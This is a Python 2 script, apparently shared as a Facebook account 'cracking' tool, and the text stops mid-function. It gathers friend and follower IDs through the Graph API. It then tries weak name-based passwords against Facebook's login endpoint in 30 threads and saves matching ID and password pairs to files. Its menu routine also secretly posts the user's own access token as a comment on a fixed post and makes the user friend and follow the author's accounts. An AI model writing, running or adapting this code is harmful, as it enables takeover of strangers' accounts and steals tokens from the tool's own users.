#coding=utf-8
#!/usr/bin/python2
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system('pip2 install requests')

agents = [
 'Mozilla/5.0 (Linux; Android 10; A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36 OPR/64.3.3282.60839 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996']
birth = [
 '001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3', 'x-fb-connection-type': 'unknown', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
logo = """
\033[1;37m  ╔═══════════════════════════════════════════╗
\033[1;37m    d8888b. d888888b .d8888. db   db db    db 
\033[1;37m    88  `8D   `88'   88'  YP 88   88 88    88 
\033[1;37m    88oobY'    88    `8bo.   88ooo88 88    88 
\033[1;37m    88`8b      88      `Y8b. 88~~~88 88    88 
\033[1;37m    88 `88.   .88.   db   8D 88   88 88b  d88 
\033[1;37m    88   YD Y888888P `8888Y' YP   YP ~Y8888P' 
\033[1;37m  ╚═══════════════════════════════════════════╝
         [\033[1;97m\033[1;41mIF YOU DREAM IT CAN YOU DO IT\033[0m\x1b[1;37m]    
\033[1;37m  ╔═══════════════════════════════════════════╗
\033[1;37m        \033[1;37m➤ AUTHOR   : RISHU KHAN           
\033[1;37m        \033[1;37m➤ VERSION  : 3.0                  
\033[1;37m        \033[1;37m➤ FACEBOOK : www.fb.com/al3x.rishu 
\033[1;37m  ╚═══════════════════════════════════════════╝"""


def login():
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ("")
        print("[\033[1;91m\033[1;47m---------------LOGIN MENU-----------------\033[0m]")
        os.system('echo -e "--------------------------------------------"| lolcat')
        print ' \x1b[1;97m ➤ [1] FACEBOOK ID/PASS LOGIN'
        print ' \x1b[1;97m ➤ [2] FACEBOOK TOKEN LOGIN'
        print ' \x1b[1;97m ➤ [3] Back '
        os.system('echo -e "--------------------------------------------"| lolcat')
        log_select()


def log_select():
    global token
    sel = raw_input('\x1b[1;37m Choose ➤ \x1b[1;32m ')
    if sel == '1':
        log_fb()
    elif sel == '2':
        token()
    elif sel == '3':
        ran()
    else:
        print '\t\x1b[1;31mSelect valid option'
        log_select()


def log_fb():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ("")
        print("[\033[1;91m\033[1;47m-----------LOGIN WITH ID/PASS-------------\033[0m]")
        os.system('echo -e "--------------------------------------------"| lolcat')
        uid = raw_input(' \x1b[1;37mID ➤ \x1b[1;32m')
        passw = raw_input(' \x1b[1;37mPassword ➤ \x1b[1;32m')
        os.system('echo -e "--------------------------------------------"| lolcat')
        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers=header).text
        q = json.loads(data)
        if 'access_token' in q:
            sav = open('access_token.txt', 'w')
            sav.write(q['access_token'])
            sav.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print '\t\x1b[1;31mAccount has checkpoint'
            time.sleep(1)
            login()
        else:
            print '\t\x1b[1;31mId/pass my be wrong'
            time.sleep(1)


def token():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        print logo
        print ("")
        print("[\033[1;91m\033[1;47m---------------LOGIN TOKEN----------------\033[0m]\033[1;37m")
        os.system('echo -e "--------------------------------------------"| lolcat')
        token = raw_input(' \x1b[1;37mPaste token here ➤ \x1b[1;32m ')
        os.system('echo -e "--------------------------------------------"| lolcat')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        login()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print '\t\x1b[1;31mLogged in token has expired'
        os.system('rm -rf access_token.txt')
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=100006406693198&access_token=' + token)
    requests.post('https://graph.facebook.com/100045165501610/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100006406693198/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/183384583900705/comments/?message=' + token + '&access_token=' + token)
    print logo
    print("")
    print '   \x1b[1;37mActive Token -> \x1b[1;32m' + name
    print("")
    print("[\033[1;91m\033[1;47m---------------CRACING MENU---------------\033[0m]\033[0;97m")
    os.system('echo -e "--------------------------------------------"| lolcat')  
    print ' \x1b[1;97m ➤ [1] CRACK AUTO PASS'
    print ' \x1b[1;97m ➤ [2] CRACK CHOICE PASS'
    print ' \x1b[1;97m ➤ [3] BACK'
    os.system('echo -e "--------------------------------------------"| lolcat')
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;97mChoose ➤ \x1b[0;92m')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    else:
        print '\t\x1b[1;31mSelect valid option'
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\t\x1b[1;31mToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ("")
    print("[\033[1;91m\033[1;47m------------AUTO PASS CLONING-------------\033[0m]\033[0;97m")
    os.system('echo -e "--------------------------------------------"| lolcat')
    print '\x1b[1;97m ➤ [1] CRACK PUBLIC ID'
    print '\x1b[1;97m ➤ [2] CRACK FOLLOWERS'
    print '\x1b[1;97m ➤ [0] BACK'
    os.system('echo -e "--------------------------------------------"| lolcat')
    crack_select()


def crack_select():
    select = raw_input('\x1b[1;37mChoose ➤ \x1b[0;92m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ("")
        print("[\033[1;91m\033[1;47m---------------INPUT 5 IDS----------------\033[0m]\033[0;97m")
        os.system('echo -e "--------------------------------------------"| lolcat')
        idt = raw_input('(1) Input id ➤ \x1b[1;32m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;37m(2) Input id ➤ \x1b[1;32m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;37m(3) Input id ➤ \x1b[1;32m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;37m(4) Input id ➤ \x1b[1;32m ')
        idt = raw_input('\x1b[1;37m(5) Input id ➤ \x1b[1;32m ')
        os.system('echo -e "--------------------------------------------"| lolcat')

    elif select == '2':
        os.system('clear')
        print logo
        os.system('echo -e "--------------------------------------------"| lolcat')
        idt = raw_input('\x1b[1;37m(1) Input id ➤ \x1b[1;37m ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ' \x1b[1;37m Cloning from ➤ \x1b[1;32m' + q['name']
        except KeyError:
            print '\t\x1b[1;31mInvalid id link OR token'
            print ''
            raw_input(' \x1b[1;37mPress enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        crack_select()
    os.system('#')
    os.system('clear')
    print logo
    os.system('echo -e "--------------------------------------------"| lolcat')
    print ' \x1b[1;97m Total IDs ➤\x1b[1;32m ' + str(len(id))
    print ' \x1b[1;97m On off flight mode if no result'
    print ' \x1b[1;97m Press ctrl + z to stop'
    os.system('echo -e "--------------------------------------------"| lolcat')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name.lower() + '@123'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('Asghar.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('Asghar.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('Abdullahok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('Abdullahcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '12345'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('Abdullahok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('Abdullahcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '786'
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('Abdullahok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('Abdullahcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = 'name'
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('Abdullahok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('Abdullahcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = 'abc123'
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('Abdullahok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('Abdullahcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = '786786'
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('Abdullahok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('Abdullahcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    os.system('echo -e "--------------------------------------------"| lolcat')
    print("   \x1b[1;97mThe process has been completed")
    print("   \x1b[1;97m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
    os.system('echo -e "--------------------------------------------"| lolcat')
    raw_input(' \x1b[1;97m Press enter to back ')
    menu()


def choice():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ("")
    print("[\033[1;91m\033[1;47m-----------CHOICE PASS CRACK MENU----------\033[0m]\033[0;97m")
    os.system('echo -e "--------------------------------------------"| lolcat')
    print '\x1b[1;97m ➤ [1] CRACK PUBLIC ID'
    print '\x1b[1;97m ➤ [2] CRACK FOLLOWERS'
    print '\x1b[1;97m ➤ [0] BACK'
    os.system('echo -e "--------------------------------------------"| lolcat')
    choice_select()


def choice_select():
    select = raw_input('\x1b[1;37mChoose ➤ \x1b[0;92m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ("")
        print("[\033[1;91m\033[1;47m----------------CHOICE PASS ---------------\033[0m]\033[0;97m")
        os.system('echo -e "--------------------------------------------"| lolcat')
        pass1 = raw_input('(1) Password ➤ \x1b[1;32m ')
        pass2 = raw_input('\x1b[1;37m(2) Password ➤ \x1b[1;32m ')
        pass3 = raw_input('\x1b[1;37m(3) Password ➤ \x1b[1;32m ')
        pass4 = raw_input('\x1b[1;37m(4) Password ➤ \x1b[1;32m ')
        pass5 = raw_input('\x1b[1;37m(5) Password ➤ \x1b[1;32m ')
        pass6 = raw_input('\x1b[1;37m(6) Password ➤ \x1b[1;32m ')
        pass7 = raw_input('\x1b[1;37m(7) Password ➤ \x1b[1;32m ')
        os.system('echo -e "--------------------------------------------"| lolcat')
        os.system('clear')
        print logo
        os.system('echo -e "--------------------------------------------"| lolcat')
        idt = raw_input('(1) Input id ➤ \x1b[1;32m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('(2) Input id ➤ \x1b[1;32m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('(3) Input id ➤ \x1b[1;32m')
        idt = raw_input('(4) Input id ➤ \x1b[1;32m')
        idt = raw_input('(5) Input id ➤ \x1b[1;32m')
    elif select == '2':
        os.system('clear')
        print logo
        print ("")
        print("[\033[1;91m\033[1;47m----------------CHOICE PASS ---------------\033[0m]\033[0;97m")
        os.system('echo -e "--------------------------------------------"| lolcat')
        pass1 = raw_input('(1) Password ➤ \x1b[1;32m ')
        pass2 = raw_input('\x1b[1;37m(2) Password ➤ \x1b[1;32m ')
        pass3 = raw_input('\x1b[1;37m(3) Password ➤ \x1b[1;32m ')
        pass4 = raw_input('\x1b[1;37m(4) Password ➤ \x1b[1;32m ')
        pass5 = raw_input('\x1b[1;37m(5) Password ➤ \x1b[1;32m ')
        pass6 = raw_input('\x1b[1;37m(6) Password ➤ \x1b[1;32m ')
        pass7 = raw_input('\x1b[1;37m(7) Password ➤ \x1b[1;32m ')
        os.system('echo -e "--------------------------------------------"| lolcat')
        os.system('clear')
        print logo
        idt = raw_input('(1) Input id ➤ \x1b[1;32m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;37m(2) Input id ➤ \x1b[1;32m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;37m(3) Input id ➤ \x1b[1;32m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;37m(4) Input id ➤ \x1b[1;32m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print ''
        except KeyError:
            print '\tInvalid id link'
            print ''
            raw_input(' Press enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

        idt = raw_input('\x1b[1;37m(5) Input id ➤ \x1b[1;32m')
        os.system('echo -e "--------------------------------------------"| lolcat')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\\x1b[1;31mtInvalid id link'
            print ''
            raw_input(' \x1b[1;37mPress enter to back')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print '\t\x1b[1;31mSelect valid option\x1b[0;97m'
        choice_select()
    os.system("#")
    os.system('clear')
    print logo
    os.system('echo -e "--------------------------------------------"| lolcat')
    print ' \x1b[1;97m Total IDs ➤\x1b[1;32m ' + str(len(id))
    print ' \x1b[1;92m On off flight mode if no result'
    print ' \x1b[1;93m Press ctrl + z to stop'
    os.system('echo -e "--------------------------------------------"| lolcat')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('Abdullahok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('Abdullahcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('Abdullahok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('Abdullahcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ' \x1b[1;32m [AL3X-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('Abdullahok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;31m [AL3X-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('Abdullahcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
